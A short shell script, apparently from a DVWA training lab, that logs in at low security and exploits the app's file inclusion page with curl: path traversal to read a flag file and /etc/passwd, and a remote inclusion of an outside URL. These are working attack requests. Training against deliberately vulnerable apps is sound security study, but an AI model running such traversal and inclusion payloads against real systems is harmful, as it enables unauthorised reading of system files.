#Login with the known details
source ../levelled_login.sh low
#Check out the "File inclusion" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/ > /dev/null
# curl -s -L -b dvwa.cookie.low 192.168.178.98/dvwa/vulnerabilities/fi/?page=file1.php > file1
# curl -s -L -b dvwa.cookie.low 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file2.php")  > file2
#Use a quick script for encoding (part of) the URL
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "../../hackable/flags/fi.php")  > hackable
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "../../../../../../etc/passwd") > passwd
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "https://en.wikipedia.org/robots.txt") > robots
unset LEVEL
unset SESSIONID
